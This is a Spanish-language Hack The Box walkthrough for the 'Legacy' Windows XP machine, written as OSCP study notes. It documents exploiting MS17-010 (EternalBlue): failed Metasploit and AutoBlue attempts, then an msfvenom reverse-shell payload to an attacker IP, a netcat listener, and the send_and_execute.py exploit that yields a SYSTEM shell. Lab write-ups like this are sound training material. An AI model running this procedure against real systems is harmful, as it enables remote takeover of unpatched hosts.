# 🟡 Legacy — HTB [Windows XP · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows XP SP3 x86 | **Dificultad:** Easy | **CVE principal:** MS17-010 (EternalBlue)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.129.5.30` |
| OS | Windows 5.1 = Windows XP SP3 (x86, 32 bits) |
| Vector | MS17-010 — EternalBlue SMB RCE |
| Acceso inicial | Shell directa como **NT AUTHORITYSYSTEM** |
| PrivEsc | No necesaria |
| Método final | `send_and_execute.py` (MS17-010 repo helviojunior) + venv Python 2 |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN legacy_full.nmap 10.129.5.30
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY
|   Workgroup: HTB
|_  System time: ...
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

**Dato clave:** `Windows XP` + `SMB abierto` + `SMB2 failed` (XP solo habla SMBv1) = candidato directo a MS17-010.

## Confirmación de vulnerabilidad

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.129.5.30
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Confirmado. Procedemos con la explotación manual sin Metasploit.

---

# 2. Intentos de explotación — Historia completa de errores

## Intento 1 — Metasploit ms17_010_psexec

El primer intento fue con Metasploit, que aparentemente es lo más directo:

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit > set RHOSTS 10.129.5.30
msf6 exploit > set LHOST 10.10.14.27
msf6 exploit > set LPORT 4444
msf6 exploit > run
```

### Output

```
[*] Started reverse TCP handler on 10.10.14.27:4444
[*] 10.129.5.30:445 - Target OS: Windows 5.1
[*] 10.129.5.30:445 - Filling barrel with fish... done
[*] 10.129.5.30:445 - <--- Entering Danger Zone --->
[*] 10.129.5.30:445 - [*] Trying stick 1 (x86)...Boom!
[*] 10.129.5.30:445 - [+] Successfully Leaked Transaction!
[*] 10.129.5.30:445 - [+] Successfully caught Fish-in-a-barrel
[*] 10.129.5.30:445 - <--- Leaving Danger Zone --->
[*] 10.129.5.30:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.5.30:445 - Uploading payload... FrDJQITr.exe
[-] 10.129.5.30:445 - Service failed to start, ERROR_CODE: 193
[*] 10.129.5.30:445 - Deleting \FrDJQITr.exe...
[*] Exploit completed, but no session was created.
```

### ¿Por qué falló?

El exploit llegó hasta SYSTEM (`Overwrite complete... SYSTEM session obtained!`), pero al subir el payload `.exe` para abrir la sesión recibió `ERROR_CODE: 193 = ERROR_BAD_EXE_FORMAT`. Metasploit generó un payload x64 y lo intentó ejecutar en un sistema x86 (Windows XP 32 bits). Windows no puede ejecutar un binario de 64 bits en una arquitectura de 32 bits.

Se probaron varios payloads para forzar x86:

```bash
# Intento con shell_reverse_tcp (x86)
set PAYLOAD windows/shell_reverse_tcp
run
# → Mismo ERROR_CODE: 193

# Intento con meterpreter x86
set PAYLOAD windows/meterpreter/reverse_tcp
run
# → Exploit completed, but no session was created
```

Metasploit seguía fallando independientemente del payload configurado manualmente. El módulo `ms17_010_psexec` tiene problemas de compatibilidad conocidos con Windows XP.

---

## Intento 2 — AutoBlue eternalblue_[exploit8.py](http://exploit8.py)

El siguiente paso fue AutoBlue-MS17-010, que tiene exploits específicos por versión de Windows:

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
./shell_prep.sh
# → LHOST: 10.10.14.27, LPORT: 4444, payload: 1, type: 1 (stageless x86)

nc -lvnp 4444

python3 eternalblue_exploit8.py 10.129.5.30 shellcode/sc_x86.bin
```

### Error

```
shellcode size: 962
numGroomConn: 13
Target OS: Windows 5.1
This exploit does not support this target
```

### ¿Por qué falló?

A pesar del nombre `exploit8`, **AutoBlue no soporta Windows XP (5.1)**. La nomenclatura es confusa:

| Script AutoBlue | Target real | NO soporta |
| --- | --- | --- |
| `eternalblue_exploit7.py` | Windows 7 / Server 2008 R2 | — |
| `eternalblue_exploit8.py` | Windows 8 / Server 2012 | Windows XP |

Windows XP es demasiado antiguo incluso para AutoBlue.

---

## Intento 3 — AutoBlue eternalblue_[exploit7.py](http://exploit7.py)

Por completar la investigación, se probó también el exploit7:

```bash
python3 eternalblue_exploit7.py 10.129.5.30 shellcode/sc_x86.bin
```

### Error

```
Target OS: Windows 5.1
This exploit does not support this target
```

Mismo resultado. El exploit7 tampoco soporta Windows XP. AutoBlue cubre Windows Vista en adelante, no XP.

---

## Intento 4 — Repo original helviojunior: send_and_[execute.py](http://execute.py) (Python 3)

El repositorio original de MS17-010 de helviojunior tiene un script específico para XP:

```bash
git clone https://github.com/helviojunior/MS17-010
cd MS17-010
python3 send_and_execute.py 10.129.5.30 shell.exe
```

### Error

```
File "send_and_execute.py", line 983
    print "Sending file %s..." % filename
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

### ¿Por qué falló?

`send_and_execute.py` está escrito en **Python 2**. En Python 2 `print` es una sentencia sin paréntesis. En Python 3 es una función que los requiere. El intérprete de Python 3 no puede parsear la sintaxis de Python 2.

---

## Intento 5 — send_and_[execute.py](http://execute.py) con Python 2 (sin entorno virtual)

```bash
python2 send_and_execute.py 10.129.5.30 shell.exe
```

### Error

```
Traceback (most recent call last):
  File "send_and_execute.py", line 2, in <module>
    from impacket import smb, smbconnection
ImportError: No module named impacket
```

### ¿Por qué falló?

`impacket` estaba instalado en el sistema para Python 3, pero **no para Python 2**. Python 2 y Python 3 tienen entornos de paquetes completamente separados — instalar una librería con `pip3` no la hace disponible para `python2`.

---

## Intento 6 — pip2 install impacket (versión incompatible)

```bash
pip2 install impacket
```

### Error

```
Collecting impacket
  Using cached impacket-0.13.0.tar.gz (1.7 MB)
    ERROR: Command errored out with exit status 1:
    error: invalid command 'egg_info'
```

### ¿Por qué falló?

Dos problemas combinados:

**Problema 1 — setuptools desactualizado:** `egg_info` es un comando de `setuptools`. La versión de setuptools para Python 2 era demasiado antigua para gestionar la instalación.

**Problema 2 — impacket 0.13.0 no soporta Python 2:** pip bajó automáticamente la última versión de impacket (`0.13.0`), que requiere Python 3.6+. La última versión compatible con Python 2.7 es `impacket==0.9.22`.

---

# 3. Solución final — Entorno virtual Python 2 con impacket 0.9.22

La solución fue aislar todo en un entorno virtual de Python 2 para evitar conflictos con el sistema, y forzar la versión correcta de impacket.

## Paso A — Crear entorno virtual Python 2

```bash
# Instalar virtualenv para Python 2
pip2 install virtualenv

# Crear el entorno virtual
python2 -m virtualenv venv_py2

# Activar
source venv_py2/bin/activate
```

## Paso B — Instalar setuptools y impacket correctos

```bash
# setuptools compatible con Python 2
pip install setuptools==44.1.1

# Última versión de impacket compatible con Python 2.7
pip install impacket==0.9.22

# Verificar
python -c "import impacket; print(impacket.__version__)"
# → 0.9.22
```

## Paso C — Generar payload x86 con msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.27 LPORT=4444 \
  -f exe -o shell.exe
```

> **Por qué `windows/shell_reverse_tcp` y no meterpreter:** Para XP con Netcat, stageless shell es más fiable. Meterpreter requiere un handler de Metasploit para gestionar la sesión correctamente.
> 

## Paso D — Listener

```bash
nc -lvnp 4444
```

## Paso E — Explotar

```bash
# Dentro del venv activado
python send_and_execute.py 10.129.5.30 shell.exe
```

### Output del exploit

```
Sending file shell.exe...
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x863d23d0
SESSION: 0xe1a26938
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x58b50
TRANS2: 0x596b0
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Executing shellcode
Done
```

### Shell recibida

```
connect to [10.10.14.27] from (UNKNOWN) [10.129.5.30] 1052
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
nt authority\system
```

Acceso directo como **NT AUTHORITYSYSTEM**. Sin escalada necesaria.

---

# 4. Post-Explotación

## Buscar flags

```
:: User flag
dir /s /b C:\user.txt
type "C:\Documents and Settings\john\Desktop\user.txt"

:: Root flag
dir /s /b C:\root.txt
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

> En Windows XP las rutas de perfiles de usuario son `C:\Documents and Settings\<usuario>\` en lugar de `C:\Users\<usuario>\` que es la estructura de Vista en adelante.
> 

---

# 5. Resumen de errores y causas

| # | Método | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Metasploit `ms17_010_psexec` | `ERROR_CODE: 193` | Payload x64 en sistema x86 (XP 32 bits) |
| 2 | Metasploit con payloads x86 forzados | Sin sesión | Incompatibilidad del módulo con Windows XP |
| 3 | AutoBlue `exploit8.py` | `This exploit does not support this target` | exploit8 = Win8/2012, no XP |
| 4 | AutoBlue `exploit7.py` | `This exploit does not support this target` | exploit7 = Win7/2008, no XP |
| 5 | `send_and_execute.py` con Python 3 | `SyntaxError: Missing parentheses` | Script escrito en Python 2 |
| 6 | `python2 send_and_execute.py` | `ImportError: No module named impacket` | impacket no instalado para Python 2 |
| 7 | `pip2 install impacket` | `error: invalid command 'egg_info'` | setuptools desactualizado + impacket 0.13.0 incompatible con Python 2 |
| ✅ | venv Python 2 + impacket 0.9.22 + `send_and_execute.py` | **SYSTEM shell** | Entorno aislado con versiones correctas |

---

# 6. ¿Qué diferencia Legacy de Blue?

Ambas máquinas usan MS17-010, pero hay diferencias críticas:

|  | Legacy (XP) | Blue (Win7) |
| --- | --- | --- |
| OS | Windows 5.1 (XP SP3) | Windows 6.1 (7 SP1) |
| Arquitectura | x86 (32 bits) | x64 (64 bits) |
| SMB | Solo SMBv1 | SMBv1 activo |
| Exploit AutoBlue | ❌ No soportado | ✅ [exploit7.py](http://exploit7.py) |
| Exploit manual | `send_and_execute.py` (Python 2) | `eternalblue_exploit7.py` (Python 3) |
| Metasploit | ❌ Problemas con XP | ✅ Funciona con configuración correcta |
| Named pipes | Disponibles (browser) | Restringidos → requiere AutoBlue |
| Paths de flags | `Documents and Settings\` | `Users\` |

La razón por la que `send_and_execute.py` funciona en XP donde AutoBlue falla es que usa **named pipes** para la ejecución (en el output ves `Using named pipe: browser`). En XP el acceso anónimo a named pipes está habilitado por defecto, mientras que en Blue estaba restringido — de ahí que en Blue necesitáramos AutoBlue que inyecta directamente en el kernel sin depender de pipes.

---

# 7. Moralejas y Notas para el OSCP

## Moraleja 1 — Windows 5.1 = XP x86: identificar el OS cambia todo el enfoque

Cuando nmap devuelve `Target OS: Windows 5.1`, eso significa Windows XP de 32 bits. Esa sola línea elimina Metasploit, AutoBlue exploit7 y exploit8, y orienta directamente hacia `send_and_execute.py` con Python 2. En el OSCP, identificar correctamente el OS en los primeros minutos ahorra una hora de intentos fallidos.

---

## Moraleja 2 — AutoBlue no es universal: saber qué cubre cada exploit

A pesar del nombre, AutoBlue no cubre Windows XP. exploit7 es para Win7/2008 R2, exploit8 es para Win8/2012. Windows XP es demasiado antiguo para ambos. Esta confusión es uno de los errores más comunes en el OSCP cuando se enfrenta una máquina legacy. La tabla de referencia:

| Script | Target | XP |
| --- | --- | --- |
| [exploit7.py](http://exploit7.py) | Win7 / Server 2008 R2 | ❌ |
| [exploit8.py](http://exploit8.py) | Win8 / Server 2012 | ❌ |
| send_and_[execute.py](http://execute.py) | XP / Server 2003 | ✅ |

---

## Moraleja 3 — Python 2 legacy: siempre entorno virtual, siempre impacket==0.9.22

Scripts como `send_and_execute.py` requieren Python 2 y una versión específica de impacket. El proceso correcto sin atajos:

```bash
python2 -m virtualenv venv_py2
source venv_py2/bin/activate
pip install setuptools==44.1.1
pip install impacket==0.9.22
```

Intentarlo sin entorno virtual garantiza conflictos. Intentarlo con pip sin fijar la versión baja impacket 0.13.0 que es solo Python 3. Estos dos pasos son no negociables para cualquier exploit legacy.

---

## Moraleja 4 — ERROR_CODE 193 no es fallo del exploit, es fallo de arquitectura

Cuando Metasploit dice `SYSTEM session obtained` y luego `Service failed to start, ERROR_CODE: 193`, el exploit funcionó perfectamente. El problema es que el payload generado era x64 y el sistema es x86. Es `ERROR_BAD_EXE_FORMAT` — Windows rechaza el ejecutable por arquitectura incorrecta. Antes de ejecutar cualquier exploit en el OSCP, confirmar siempre la arquitectura del target.

---

## Moraleja 5 — Named pipes habilitados en XP: por qué funciona send_and_execute y no AutoBlue

El output del exploit dice `Using named pipe: browser`. En XP el acceso anónimo a named pipes está habilitado por defecto, lo que permite a `send_and_execute.py` inyectar el payload a través del pipe. En Blue (Win7) esos pipes estaban restringidos, de ahí que necesitáramos AutoBlue que inyecta en el kernel directamente. Entender esta diferencia explica por qué el mismo CVE requiere herramientas distintas según el target.

---

## Moraleja 6 — Rutas de Windows XP son diferentes a Vista en adelante

En XP los perfiles de usuario están en `C:\Documents and Settings\<usuario>\Desktop\`, no en `C:\Users\`. Si buscas las flags con `dir /s /b C:\Users\` no encontrarás nada. Usar siempre `dir /s /b C:\user.txt` para localizar sin asumir la ruta.

---

## Moraleja 7 — El patrón completo de Legacy para el OSCP

```
nmap → Windows 5.1 (XP x86) + SMB + SMB2 failed
    ↓
nmap --script smb-vuln-ms17-010 → confirmar
    ↓
Metasploit falla (ERROR_CODE 193) → AutoBlue falla (not supported)
    ↓
repo helviojunior + venv Python 2 + impacket==0.9.22
    ↓
send_and_execute.py + shell.exe → NT AUTHORITY\SYSTEM
    ↓
Flags en C:\Documents and Settings\
```

---

# 8. Lecciones aprendidas

| Concepto | Detalle |
| --- | --- |
| **Windows 5.1 = XP x86** | Detectar la versión exacta del OS orienta directamente qué exploits usar |
| **AutoBlue ≠ XP** | A pesar de tener exploit7 y exploit8, AutoBlue no cubre Windows XP |
| **Python 2 vs Python 3** | Scripts legacy requieren Python 2 — siempre usar entornos virtuales para aislar dependencias |
| **impacket==0.9.22** | Última versión compatible con Python 2.7 — versiones 0.10+ son solo Python 3 |
| **Named pipes en XP** | Por defecto habilitados — `send_and_execute.py` los usa para ejecutar el payload |
| **ERROR_CODE 193** | `ERROR_BAD_EXE_FORMAT` — siempre verificar arquitectura del target antes de generar payloads |
| **Venv para dependencias legacy** | Aislar entornos evita conflictos entre versiones de Python y librerías del sistema |

---

# 8. Comandos clave (resumen rápido)

```bash
# Verificar vulnerabilidad
nmap --script smb-vuln-ms17-010 -p 445 10.129.5.30

# Preparar entorno
python2 -m virtualenv venv_py2
source venv_py2/bin/activate
pip install setuptools==44.1.1 impacket==0.9.22

# Generar payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f exe -o shell.exe

# Listener
nc -lvnp 4444

# Explotar
python send_and_execute.py 10.129.5.30 shell.exe

# Flags (XP usa Documents and Settings, no Users)
dir /s /b C:\user.txt
dir /s /b C:\root.txt
```

flags:

![flags](assets/image.png)
![flags](assets/image%201.png)
